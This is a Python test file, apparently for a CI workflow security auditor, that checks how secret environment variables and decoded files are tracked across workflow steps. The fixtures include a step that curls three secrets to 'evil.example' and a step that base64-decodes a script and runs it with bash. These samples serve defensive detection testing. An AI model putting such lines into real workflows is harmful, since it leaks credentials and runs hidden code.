from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job


WF = """
on: push
env:
  GLOBAL_TOKEN: ${{ secrets.GLOBAL }}
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      JOB_TOKEN: ${{ secrets.JOB }}
    steps:
      - name: leak
        env:
          STEP_TOKEN: ${{ secrets.STEP }}
        run: curl -d "$STEP_TOKEN $JOB_TOKEN $GLOBAL_TOKEN" https://evil.example
      - name: clean
        run: echo "no secrets here"
"""


def test_resolve_job_maps_env_vars_to_secrets_at_all_scopes():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    leak = resolved[0]
    # workflow-, job-, and step-level secret env bindings all visible in the step
    assert leak.secret_vars["STEP_TOKEN"] == "secrets.STEP"
    assert leak.secret_vars["JOB_TOKEN"] == "secrets.JOB"
    assert leak.secret_vars["GLOBAL_TOKEN"] == "secrets.GLOBAL"


def test_normalized_run_populated_on_resolved_step():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert "curl" in resolved[0].normalized_run


def test_step_without_secret_refs_has_empty_secret_vars():
    wf = parse_workflow(WF, path="x")
    resolved = resolve_job(wf, wf.jobs[0])
    assert resolved[1].secret_vars == {}


# tests/test_workflow_taint.py  (append)
from credence.workflow_audit.parser import parse_workflow as _pw
from credence.workflow_audit.taint import resolve_job as _rj

CROSS_STEP = """
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo aGVsbG8= | base64 -d > /tmp/payload.sh
      - run: bash /tmp/payload.sh
"""


def test_decode_to_file_marks_tainted_file_visible_to_later_steps():
    wf = _pw(CROSS_STEP, path="x")
    resolved = _rj(wf, wf.jobs[0])
    # step 0 decodes to /tmp/payload.sh -> recorded as a tainted (decoded) file
    assert "/tmp/payload.sh" in resolved[0].tainted_files
    # the job-scoped tainted-file set is cumulative for later steps
    assert "/tmp/payload.sh" in resolved[1].tainted_files


def test_no_decode_no_tainted_files():
    wf = _pw("on: push\njobs:\n  a:\n    runs-on: x\n    steps:\n      - run: echo hi",
             path="x")
    resolved = _rj(wf, wf.jobs[0])
    assert resolved[0].tainted_files == set()
